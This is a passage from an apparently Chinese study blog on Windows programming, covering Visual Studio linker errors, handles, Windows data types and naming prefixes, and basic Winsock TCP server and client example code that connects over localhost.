class="line">&#125;</span><br></pre></td></tr></table></figure><br><h4 id="2-1-1-链接错误"><a href="#2-1-1-链接错误" class="headerlink" title="2.1.1 链接错误"></a>2.1.1 链接错误</h4><p>🔺出现链接错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//错误:    LNK2019	无法解析的外部符号 _main</span></span><br><span class="line"><span class="comment">//函数 &quot;int __cdecl invoke_main(void)&quot; (?invoke_main@@YAHXZ) 中引用了该符号    windows_start</span></span><br></pre></td></tr></table></figure><p>解决：修改配置属性【链接器 | 所有选项 | 子系统：窗口】</p><h4 id="2-1-2-LNK1104-无法打开文件-exe"><a href="#2-1-2-LNK1104-无法打开文件-exe" class="headerlink" title="2.1.2 LNK1104: 无法打开文件*.exe"></a>2.1.2 <code>LNK1104</code>: 无法打开文件<code>*.exe</code></h4><ul><li>解决方案一：打开任务管理器，关掉项目中的<code>.exe</code>文件，再重新生成解决方案；</li><li>解决方案二：修改你的项目文件夹的属性为非只读文件，打开项目文件夹【右击-属性-只读前面的方框取消】，再重新生成解决方案；</li><li>解决方案三：如果修改了代码后才出现了这样的问题，可能代码修改没有应用到程序内。解决：点击<code>vs</code>中的生成-配置管理器，勾选生成下面的√【win32改成x64】。</li></ul><br><h3 id="2-2-API与SDK"><a href="#2-2-API与SDK" class="headerlink" title="2.2 API与SDK"></a>2.2 API与SDK</h3><p><code>Application Programming Interface</code> 应用程序编程接口。</p><p><code>Software Development Kit</code> 软件开发工具包，一般会包括API接口文档、示例文档、帮助文档、使用手册、相关工具等。</p><h3 id="2-3-窗口与句柄-窗口类对象"><a href="#2-3-窗口与句柄-窗口类对象" class="headerlink" title="2.3 窗口与句柄/窗口类对象"></a>2.3 窗口与句柄/窗口类对象</h3><p>窗口就是屏幕上的一片区域，接收用户的输入，显示程序的输出。可以包含标题栏，菜单栏，工具栏，控件等。</p><p><img src="./2-1.png" alt="img"></p><p>句柄<code>handle</code> 【资源的编号 | 二级指针 | 门把手】：窗口句柄，文件句柄，数据库连接句柄。</p><blockquote><p>值得注意的是：C++窗口类对象与窗口并不是一回事。</p><p>它们之间惟一的关系是C++窗口类对象内部定义了一个窗口句柄变量，保存了与这个C++窗口类对象相关的那个窗口的句柄。窗口销毁时，与之对应的C++窗口类对象销毁与否，要看其生命周期是否结束。但C++窗口类对象销毁时，与之相关的窗口也将销毁。</p></blockquote><ol><li>生命周期 &gt; 窗口类对象周期 <code>&gt;</code> 窗口</li><li>窗口类内部定义了窗口句柄<code>m_wnd</code></li></ol><h3 id="2-4-消息循环"><a href="#2-4-消息循环" class="headerlink" title="2.4 消息循环"></a>2.4 消息循环</h3><ul><li><p>银行场景<br><img src="./2-2.png" alt="bank"></p></li><li><p>windows消息循环</p><p><img src="./2-3.jpg" alt="DispatchMessage"></p></li></ul><h3 id="2-5-Windows数据类型和命名规范"><a href="#2-5-Windows数据类型和命名规范" class="headerlink" title="2.5 Windows数据类型和命名规范"></a>2.5 Windows数据类型和命名规范</h3><p>🔺<code>Unicode</code>是世界通用的字符编码标准，使用16位数据表示一个字符，一共可以表示65535种字符。</p><p>🔺<code>ASNI</code>字符集，使用8位数据或将相邻的两个8位的数据组合在一起表示特殊的语言字符。如果一个字节是负数，则将其后续的一个字节组合在一起表示一个字符。这种编码方式的字符集也称作<strong>多字节字符集</strong>。</p><table><thead><tr><th>数据类型</th><th>含义</th><th>本质</th></tr></thead><tbody><tr><td>DWORD</td><td>32位无符号整型数据</td><td>unsigned long</td></tr><tr><td>DWORD32</td><td>32位无符号整型数据</td><td>unsigned int</td></tr><tr><td>DWORD64</td><td>64位无符号整型数据</td><td>unsigned __int64</td></tr><tr><td>HANDLE</td><td>对象的句柄，最基本的句柄类型</td><td>void*</td></tr><tr><td>HICON</td><td>图标的句柄</td><td>void*</td></tr><tr><td>HINSTANCE</td><td>程序实例的句柄，32位无符号的长整形</td><td>unsigned long</td></tr><tr><td>HKEY</td><td>注册表键的句柄</td><td>void*</td></tr><tr><td>HMODULE</td><td>模块的句柄</td><td>HINSTANCE</td></tr><tr><td>HWND</td><td>窗口的句柄</td><td>void*</td></tr><tr><td>INT</td><td>32位符号整型数据类型</td><td>int</td></tr><tr><td>INT_PTR</td><td>指向INT类型数据的指针类型</td><td>int</td></tr><tr><td>INT32</td><td>32位符号整型</td><td>signed int</td></tr><tr><td>INT64</td><td>64位符号整型</td><td>signed __int64</td></tr><tr><td>LONG32</td><td>32位符号整型</td><td>signed int</td></tr><tr><td>LONG64</td><td>64位符号整型</td><td>__int64</td></tr><tr><td>LPARAM</td><td>消息的L参数</td><td>LONG_PTR: long</td></tr><tr><td>WPARAM</td><td>消息的W参数</td><td>UINT_PTR: unsigned int</td></tr><tr><td>LPCSTR</td><td>Windows，ANSI，字符串常量【指针P const string】</td><td>char</td></tr><tr><td>LPCTSTR</td><td>根据环境配置，如果定义了UNICODE宏，则是LPCWSTR类型，否则是LPCSTR类型</td><td>wchar_t/char</td></tr><tr><td>LPCWSTR</td><td>UNICODE字符串常量【const wchar string】</td><td>wchar_t</td></tr><tr><td>LPDWORD</td><td>指向DWORD类型数据的指针</td><td>unsigned long</td></tr><tr><td>LPSTR</td><td>Window，ANSI，字符串变量【无W】</td><td>char</td></tr><tr><td>LPTSTR</td><td>根据环境配置，如果定义了UNICODE，则是LPWSTR类型，否则是LPSTR类型</td><td>wchar_t/char</td></tr><tr><td>LPWSTR</td><td>UNICODE字符串变量【W】</td><td>wchar_t</td></tr><tr><td>SIZE_T</td><td>表示内存大小，以字节为单位，其最大值是CPU最大寻址范围</td><td>unsigned long</td></tr><tr><td>TCHAR</td><td>如果定义了UNICODE，则为WCHAR，否则为CHAR</td><td>wchar_t/char</td></tr><tr><td>WCHAR</td><td>16位Unicode字符</td><td>wchar_t</td></tr></tbody></table><p><strong>命名规范：</strong></p><table><thead><tr><th>前缀</th><th>含义</th><th>前缀</th><th>含义</th></tr></thead><tbody><tr><td>a</td><td>数组 array</td><td>b</td><td>布尔值 bool</td></tr><tr><td>by</td><td>无符号字符(字节)</td><td>c</td><td>字符(字节)</td></tr><tr><td>cb</td><td>字节计数</td><td>rgb</td><td>保存颜色值的长整型</td></tr><tr><td>cx,cy</td><td>短整型(计算x,y的长度)</td><td>dw</td><td>无符号长整型</td></tr><tr><td>fn</td><td>函数</td><td>h</td><td>句柄</td></tr><tr><td>i</td><td>整形(integer)</td><td>m_</td><td>类的数据成员member</td></tr><tr><td>n</td><td>短整型或整型</td><td>np</td><td>近指针</td></tr><tr><td>p</td><td>指针(pointer)</td><td>l</td><td>长整型(long)</td></tr><tr><td>lp</td><td>长指针</td><td>s</td><td>字符串string</td></tr><tr><td>sz</td><td>以零结尾的字符串</td><td>tm</td><td>正文大小</td></tr><tr><td>w</td><td>无符号整型</td><td>x,y</td><td>无符号整型(表示x,y的坐标)</td></tr></tbody></table><br><h2 id="三-网络编程"><a href="#三-网络编程" class="headerlink" title="三 网络编程"></a>三 网络编程</h2><h3 id="3-1-网络编程基本概念"><a href="#3-1-网络编程基本概念" class="headerlink" title="3.1 网络编程基本概念"></a>3.1 网络编程基本概念</h3><h4 id="3-1-1-socket概念"><a href="#3-1-1-socket概念" class="headerlink" title="3.1.1 socket概念"></a>3.1.1 socket概念</h4><p>套接字在英文里面就是“插孔/插座”的意思，套接字是网络数据传输用的软件设备。</p><p>创建一个套接字就相当于是安装了一部电话机。</p><h4 id="3-1-2-什么是C-S模式"><a href="#3-1-2-什么是C-S模式" class="headerlink" title="3.1.2 什么是C/S模式"></a>3.1.2 什么是C/S模式</h4><p>客户机/服务器模式在操作过程中采取主动请求的方式。</p><ul><li><p>服务器端：</p><ol><li>首先服务器先启动，并根据请求提供相应的服务：</li><li>打开一个通信通道，在某一地址和端口上接收请求。</li><li>等待客户请求到达该端口。</li><li>接收到重复服务请求，处理该请求并发送应答信号。</li><li>返回第二步，等待另一客户请求。</li><li>关闭服务器。</li></ol></li><li><p>客户端：</p><ol><li>打开一个通信通道，并连接到服务器所在主机的特定端口。</li><li>向服务器发服务请求，等待并接收应答；继续提出请求。</li><li>请求结束后关闭通信通道并终止。</li></ol></li></ul><h4 id="3-1-3-什么是面向连接和面向消息【TCP-UDP】"><a href="#3-1-3-什么是面向连接和面向消息【TCP-UDP】" class="headerlink" title="3.1.3 什么是面向连接和面向消息【TCP/UDP】"></a>3.1.3 什么是面向连接和面向消息【TCP/UDP】</h4><p>面向连接的套接字TCP：</p><ul><li>传输过程中数据不会丢失</li><li>按顺序传输数据</li><li>传输的过程中不存在数据边界【100个糖果分批传递，但接受者需要凑齐100个装袋】</li></ul><p>面向消息的套接字UDP：</p><ul><li>强调快速传输而非顺序</li><li>传输的数据可能丢失也可能损毁</li><li>限制每次传输数据的大小</li><li>传输的数据有数据边界</li></ul><h4 id="3-1-4-IP地址和端口"><a href="#3-1-4-IP地址和端口" class="headerlink" title="3.1.4 IP地址和端口"></a>3.1.4 IP地址和端口</h4><p>IP地址：是分配给用户上网使用的网际协议</p><ul><li>常见的的IP地址分为IPv4与iPV6两大类，但是也有其他不常用的小分类</li><li>IP地址就好像街道地址【地址码】：有了某人的街道地址，你就能找到他并与他通信了。同样，有了某台主机的IP地址，你就能与这台主机通信了。</li></ul><p>Port端口：为区分程序中创建的套接字而分配给套接字的序号。</p><ul><li>如果把IP地址比作房子，端口就是出入房子的门。</li><li>真正的房子只有几个门，但端口可以有65536（即：2^16）个之多！<ul><li>0-1023一般被用作知名服务器的端口，被预定，如FTP、HTTP、SMTP</li><li>WWW选择80，而FTP则以21为正常的联机信道</li></ul></li></ul><br><h3 id="3-2-套接字类型与协议设置"><a href="#3-2-套接字类型与协议设置" class="headerlink" title="3.2 套接字类型与协议设置"></a>3.2 套接字类型与协议设置</h3><ul><li><code>SOCK_STREAM</code>【流套接字】TCP：面向连接、可靠的数据传输 ，适合传输大量的数据，不支持广播、多播</li><li><code>SOCK_DGRAM</code>【数据包套接字】 UDP：无连接 支持广播、多播【报文】</li><li><code>SOCK_RAW</code>【原始套接字】：可以读写内核没有处理的IP数据报，避开TCP/IP处理机制，被传送的数据报可以被直接传送给需要它的的应用程序</li></ul><p>头文件与库：</p><ul><li>引用头文件<code>winsock2.h</code></li><li>导入<code>ws2_32.lib</code>库</li><li>window下socket编程都要首先进行Winsock的初始化</li></ul><br><h3 id="3-3-网络编程基本函数和基本数据结构"><a href="#3-3-网络编程基本函数和基本数据结构" class="headerlink" title="3.3 网络编程基本函数和基本数据结构"></a>3.3 网络编程基本函数和基本数据结构</h3><table><thead><tr><th>函数名称</th><th>功能描述</th><th>适用范围</th></tr></thead><tbody><tr><td>socket</td><td>创建套接字</td><td>面向连接的传输+面向无连接的传输</td></tr><tr><td>bind</td><td>套接字与本地IP地址和端口号的绑定</td><td>面向连接的传输+面向无连接的传输</td></tr><tr><td>connect</td><td>请求连接</td><td>面向连接的传输的客户机进程</td></tr><tr><td>listen</td><td>侦听连接请求</td><td>面向连接的传输的服务器进程</td></tr><tr><td>accept</td><td>接收连接请求</td><td>面向连接的传输的服务器进程</td></tr><tr><td>send</td><td>往已建立连接的套接字上发送数据</td><td>面向连接的传输</td></tr><tr><td>recv</td><td>从已建立连接的套接字上接收数据</td><td>面向连接的传输</td></tr><tr><td>sendto</td><td>在无连接的套接字上发送数据</td><td>主要用于无连接的传输</td></tr><tr><td>recvfrom</td><td>在无连接的套接字上接收数据</td><td>主要用于无连接的传输</td></tr><tr><td>close</td><td>关闭套接字</td><td>面向连接的传输+面向无连接的传输</td></tr></tbody></table><p>数据结构：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr</span> &#123;            <span class="comment">//操作系统使用</span></span><br><span class="line">  u_short  sa_family;      <span class="comment">//16位地址类型 2字节</span></span><br><span class="line">  <span class="type">char</span>    sa_data[<span class="number">14</span>];      <span class="comment">//14字节地址数据：ip + port</span></span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> &#123;        <span class="comment">//程序员使用</span></span><br><span class="line">  <span class="type">short</span>  sin_family;         <span class="comment">//16位地址类型</span></span><br><span class="line">  u_short sin_port;            <span class="comment">//16位端口号 65535 2的16次方</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">in_addr</span> sin_addr;  <span class="comment">//32位IP地址 4字节</span></span><br><span class="line">  <span class="type">char</span>  sin_zero[<span class="number">8</span>];        <span class="comment">//8字节填充</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br><h3 id="3-4-基于TCP的服务端-客户端"><a href="#3-4-基于TCP的服务端-客户端" class="headerlink" title="3.4 基于TCP的服务端/客户端"></a>3.4 基于TCP的服务端/客户端</h3><blockquote><p>VS技巧：在同一个解决方案中创建多个项目【解决方案右击菜单 -&gt; 添加 】，可右击项目设置为启动项</p><p>注意：上面的方法创建的项目，生成解决方案后，会在总解决方案的Debug文件夹中生成可执行的exe文件</p></blockquote><h4 id="3-4-1-TCP套接字"><a href="#3-4-1-TCP套接字" class="headerlink" title="3.4.1 TCP套接字"></a>3.4.1 TCP套接字</h4><p><img src="./3-1.png" alt="tcp_socket"></p><p>📋服务端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span><span class="comment">//printf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span><span class="comment">//system</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;TCP Server\n&quot;</span>);</span><br><span class="line">    <span class="comment">//0 初始化网络库</span></span><br><span class="line">    WORD wVersionRequested;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 初始化套接字库</span></span><br><span class="line">    err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">1</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1 安装电话机 【可选择函数，按F1转到联网资源】</span></span><br><span class="line">    SOCKET  sockServ = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//tcp ipv4</span></span><br><span class="line">    <span class="keyword">if</span> (INVALID_SOCKET == sockServ)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Server socket errno: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">//errno：10093【应用程序没有调用 WSAStartup，或者 WSAStartup 失败。 】</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2 分配电话号码，填充参数</span></span><br><span class="line">    SOCKADDR_IN addrServ, addrClient;</span><br><span class="line">    <span class="type">int</span> szAddrCnt = <span class="built_in">sizeof</span>(addrClient);</span><br><span class="line"></span><br><span class="line">    addrServ.sin_family = PF_INET;</span><br><span class="line">    addrServ.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">    addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockServ, (sockaddr*)&amp;addrServ, <span class="built_in">sizeof</span>(addrServ)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind ERRORNO = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3 监听</span></span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(sockServ, <span class="number">5</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;listen ERRORNO = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4 accpet 分配一台分机处理客户端连接</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Wait ACCEPT:\n&quot;</span>);</span><br><span class="line">        SOCKET sockCnt = <span class="built_in">accept</span>(sockServ, (sockaddr*)&amp;addrClient, &amp;szAddrCnt);</span><br><span class="line">        <span class="type">char</span> sendBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="comment">//sprintf_s(sendBuf, 100, &quot;Welcome %s to Server!&quot;, inet_ntoa(addrClient.sin_addr));//字符串拷贝函数</span></span><br><span class="line">        <span class="built_in">sprintf_s</span>(sendBuf, <span class="number">100</span>, <span class="string">&quot;Welcome %s to Server!&quot;</span>);</span><br><span class="line">        <span class="comment">//5 收发数据</span></span><br><span class="line">        <span class="type">int</span> iLen = <span class="built_in">send</span>(sockCnt, sendBuf, <span class="built_in">strlen</span>(sendBuf), <span class="number">0</span>);<span class="comment">//flag=0 表示阻塞</span></span><br><span class="line">        <span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        iLen = <span class="built_in">recv</span>(sockCnt, recvBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recvBuf= %s\n&quot;</span>, recvBuf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6 关闭分机</span></span><br><span class="line">        <span class="built_in">closesocket</span>(sockCnt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//7 关闭总机</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sockServ);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>报错<code>LINK2019</code>：即bind/accept等函数的外部库未导入【解决：<code>#pragma comment(lib,&quot;ws2_32.lib&quot;)</code>】</li><li>第一步必须初始化网络库</li><li><code>GetLastErro()</code>函数取得错误后，可使用【工具 | 查找错误】</li><li>未初始化网络库时，报错<code>10093</code>【应用程序没有调用 <code>WSAStartup</code>，或者 <code>WSAStartup</code> 失败】【36行】</li></ul><p>📋客户端【在统一解决方案下添加空项目】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;TCP Client\n&quot;</span>);</span><br><span class="line">    <span class="comment">//0 初始化网络库</span></span><br><span class="line">    WORD wVersionRequested;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 初始化套接字库</span></span><br><span class="line">    err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">1</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1 安装电话机 【可选择函数，按F1转到联网资源】</span></span><br><span class="line">    SOCKET  sockClient = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//tcp ipv4</span></span><br><span class="line">    <span class="keyword">if</span> (INVALID_SOCKET == sockClient)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Server socket errno: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">//errno：10093【应用程序没有调用 WSAStartup，或者 WSAStartup 失败。 】</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 connect 配置要连接的服务器</span></span><br><span class="line">    SOCKADDR_IN addrServ;</span><br><span class="line">    <span class="type">int</span> szAddrCnt = <span class="built_in">sizeof</span>(addrServ);</span><br><span class="line"></span><br><span class="line">    addrServ.sin_family = AF_INET;</span><br><span class="line">    addrServ.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3 连接服务器</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sockClient, (sockaddr*)&amp;addrServ, <span class="built_in">sizeof</span>(addrServ)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connect ERRORNO = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4 收发数据</span></span><br><span class="line">    <span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> iLen = <span class="built_in">recv</span>(sockClient, recvBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;recvBuf: %s\n&quot;</span>, recvBuf);</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> sendBuf[<span class="number">100</span>] =<span class="string">&quot;hhhhhh&quot;</span>;</span><br><span class="line">    iLen = <span class="built_in">send</span>(sockClient, sendBuf, <span class="built_in">strlen</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5 关闭套接字</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sockClient);</span><br><span class="line">    <span class="comment">//6 终止套接字</span></span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="comment">//如果操作成功，则返回值为零。 否则，将返回值SOCKET_ERROR，并且可以通过调用 WSAGetLastError 检索特定的错误号。</span></span><br><span class="line">    <span class="comment">//	在多线程环境中， WSACleanup 终止所有线程的 Windows 套接字操作。</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>从文件管理器打开服务器，设置客户端为启动项来调试客户端</li></ul><p>🔺关于<code>inet_addr</code>的报错</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">错误    C4996	<span class="string">&#x27;inet_addr&#x27;</span>: </span><br><span class="line"><span class="function">Use <span class="title">inet_pton</span><span class="params">()</span> <span class="keyword">or</span> <span class="title">InetPton</span><span class="params">()</span> instead <span class="keyword">or</span> define _WINSOCK_DEPRECATED_NO_WARNINGS to disable deprecated API warnings</span></span><br></pre></td></tr></table></figure><p><strong>解决办法：</strong>【属性 | C++ | 预处理器：预处理器定义】在第一栏中添加<code>_WINSOCK_DEPRECATED_NO_WARNINGS</code></p><br><h4 id="3-4-2-UDP套接字"><a href="#3-4-2-UDP套接字" class="headerlink" title="3.4.2 UDP套接字"></a>3.4.2 UDP套接字</h4><p><img src="./3-2.png" 